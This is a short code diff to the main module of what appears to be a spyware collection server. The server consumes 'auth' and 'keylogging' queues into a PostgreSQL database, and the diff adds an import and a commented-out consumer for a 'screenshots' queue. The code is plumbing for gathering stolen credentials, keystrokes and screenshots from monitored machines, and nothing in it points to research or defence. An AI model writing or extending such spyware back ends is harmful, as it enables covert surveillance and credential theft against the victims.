@@ -3,6 +3,7 @@ import pika, psycopg2 as pg
 from spyware_server_common.config import get_config
 from .consumers.authentication import create_authentication_callback
 from .consumers.keylogging import create_keylogging_callback
+from .consumers.screenshots import create_screenshots_callback
 from .amqp import openAmqpConnection, initQueues
 
 def main () :
@@ -20,6 +21,7 @@ def main () :
         mainChannel.basic_qos(prefetch_count=1)
         mainChannel.basic_consume('auth', create_authentication_callback(pgCursor))
         mainChannel.basic_consume('keylogging', create_keylogging_callback(pgCursor))
+        # mainChannel.basic_consume('screenshots', create_screenshots_callback(amqpConnection))
 
         mainChannel.start_consuming()
     except KeyboardInterrupt :
